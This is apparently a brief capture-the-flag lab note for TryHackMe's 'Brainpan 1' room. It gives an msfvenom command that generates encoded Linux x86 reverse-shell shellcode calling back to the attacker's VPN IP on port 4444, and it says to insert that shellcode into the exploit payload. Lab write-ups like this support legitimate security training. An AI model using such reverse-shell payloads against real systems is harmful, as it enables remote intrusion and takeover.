# TryHackMe's "Brainpan 1" room (https://tryhackme.com/room/brainpan).

# First of all create your shellcode for linux with:
(msfvenom -p linux/x86/  shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00")
# Introduce the shellcode in the payload.
[![1e85c1ebf1b58d771d1fd78b8a728ad7.png](https://i.postimg.cc/652MhLzL/1e85c1ebf1b58d771d1fd78b8a728ad7.png)](https://postimg.cc/mt43L9vt)

